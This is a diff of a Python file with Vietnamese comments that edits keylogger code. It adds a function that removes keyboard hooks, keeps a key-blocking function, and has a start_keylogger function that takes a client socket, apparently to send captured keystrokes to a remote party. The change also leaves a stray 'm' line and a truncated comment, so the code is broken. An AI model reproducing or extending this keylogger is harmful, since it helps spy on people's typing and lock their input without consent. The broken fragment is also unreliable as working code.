@@ -1,13 +1,16 @@
 import keyboard
 
 def block_all_keys():
-    """Khóa tất cả các phím."""
+    """Khóa tất cả các phím trong danh sách."""
     for key in normal_keys:
         keyboard.block_key(key)
+        
+def unblock_all_keys():
+    """Mở khóa tất cả các phím bằng cách bỏ hết hook."""
+    keyboard.unhook_all()  # Gỡ bỏ tất cả các hook, mở khóa mọi phí
 
 def start_keylogger(client_socket):
-    """Bắt đầu keylogger và ghi lại các phím nhấn."""
-    keys = []
+    """Bắt đầu keylogger và ghi lại các phím nhấn."""    
 
     def on_key_event(event):
         if event.name == 'esc':  # Nếu phím Esc được nhấn, dừng keylogger
@@ -26,10 +29,7 @@ def start_keylogger(client_socket):
     print("Keylogger is running. Press 'Esc' to stop.")
     keyboard.wait('esc')  # Chờ cho đến khi có sự kiện Esc được nhấn
 
-def unblock_all_keys():
-    """Mở khóa tất cả các phím."""
-    for key in normal_keys:
-        keyboard.unblock_key(key)
+m
 
 # Đặt danh sách các phím hợp lệ
 normal_keys = [
